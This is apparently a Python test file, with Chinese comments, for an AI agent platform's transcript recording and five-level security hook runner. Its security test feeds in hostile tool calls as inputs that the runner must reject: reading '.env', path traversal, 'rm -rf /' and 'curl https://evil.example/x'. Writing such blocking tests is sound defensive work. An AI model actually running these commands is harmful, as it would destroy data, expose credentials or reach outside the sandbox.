"""匠人双层 Transcript 自动落盘与统一 5 级安全 HookRunner 测试。"""

from __future__ import annotations

from typing import Any

import taifeng

from server.engine.runtime.security_hooks import build_runtime_hooks


async def test_artisan_session_records_dual_layer_transcript_automatically(
    world: Any, step: Any,
) -> None:
    """任意匠人会话执行一轮后，EngineEventHub 自动落盘双层脱敏 Transcript 并写入全局索引。"""
    p = world.platform
    await p.packages.publish(world.admin, world.archive(), activate=True)
    world.models.script(step(text="已帮你核查工单状态：全部正常。"))

    session = await p.sessions.create(world.admin, package="support-desk", entry="triage")
    turn = await p.sessions.send_message(world.admin, session.session_id, "查一下工单状态")
    async for _ in turn.stream.events():
        pass

    records = await p.store.transcript_store.list_for_trace("acme", f"sess:{session.session_id}")
    assert len(records) == 1
    rec = records[0]
    assert rec.kind == "artisan"
    assert rec.status == "completed"
    assert rec.compact_object_key is not None
    assert rec.full_object_key is not None

    page = await p.transcripts.read("acme", rec.span_id, mode="full")
    assert page.source == "local"
    assert any("全部正常" in str(line.get("payload")) for line in page.lines)


async def test_unified_five_level_security_hooks_block_unsafe_ops(world: Any) -> None:
    """统一 5 级安全 HookRunner 拦截敏感凭据、只读输入修改、破坏性命令与断网外连。"""
    p = world.platform
    await p.packages.publish(world.admin, world.archive(), activate=True)
    resolved = await p.packages.resolve("acme", "support-desk")
    runner = build_runtime_hooks(resolved)

    def _ctx(extras: dict[str, Any]) -> taifeng.HookContext:
        return taifeng.HookContext(
            thread_id="t1", submission_id="sub1", entry_skill_id="triage", extras=extras,
        )

    # L1: 敏感凭据与路径穿越硬拒
    d_env = await runner.run(
        "pre_tool_use",
        taifeng.PreToolUseHook(tool_name="read_file", arguments={"path": ".env"}, parallel_safe=True, call_id="c1"),
        _ctx({}),
    )
    assert not d_env.allow and "敏感或越界路径" in (d_env.reason or "")

    d_trav = await runner.run(
        "pre_tool_use",
        taifeng.PreToolUseHook(tool_name="file_write", arguments={"path": "../escape.txt"}, parallel_safe=False, call_id="c2"),
        _ctx({}),
    )
    assert not d_trav.allow

    # L2: 只读输入/接力产物目录禁写
    d_ro = await runner.run(
        "pre_tool_use",
        taifeng.PreToolUseHook(
            tool_name="file_write",
            arguments={"path": "/workspace/inputs/from_step_1/a.md"},
            parallel_safe=False,
            call_id="c3",
        ),
        _ctx({}),
    )
    assert not d_ro.allow and "只读输入" in (d_ro.reason or "")

    # L1+L3: 破坏性命令与断网沙盒外连命令拦截
    d_rm = await runner.run(
        "pre_tool_use",
        taifeng.PreToolUseHook(tool_name="run_command", arguments={"command": "rm -rf /"}, parallel_safe=False, call_id="c4"),
        _ctx({}),
    )
    assert not d_rm.allow and "破坏性" in (d_rm.reason or "")

    d_curl = await runner.run(
        "pre_tool_use",
        taifeng.PreToolUseHook(
            tool_name="run_command",
            arguments={"command": "curl https://evil.example/x"},
            parallel_safe=False,
            call_id="c5",
        ),
        _ctx({}),
    )
    assert not d_curl.allow and "断网沙盒" in (d_curl.reason or "")

    # 安全写入放行并写入审计注记
    checks: list[dict[str, Any]] = []
    d_ok = await runner.run(
        "pre_tool_use",
        taifeng.PreToolUseHook(
            tool_name="file_write",
            arguments={"path": "outputs/report.md"},
            parallel_safe=False,
            call_id="c6",
        ),
        _ctx({"security_checks": checks}),
    )
    assert d_ok.allow and len(checks) == 1

    # L4: 超大输出提醒
    notices: list[str] = []
    await runner.run(
        "post_tool_use",
        taifeng.PostToolUseHook(
            tool_name="run_command",
            arguments={},
            output="x" * 90_000,
            is_error=False,
            duration_ms=25,
            call_id="c7",
        ),
        _ctx({"security_notices": notices}),
    )
    assert len(notices) == 1 and "体积较大" in notices[0]
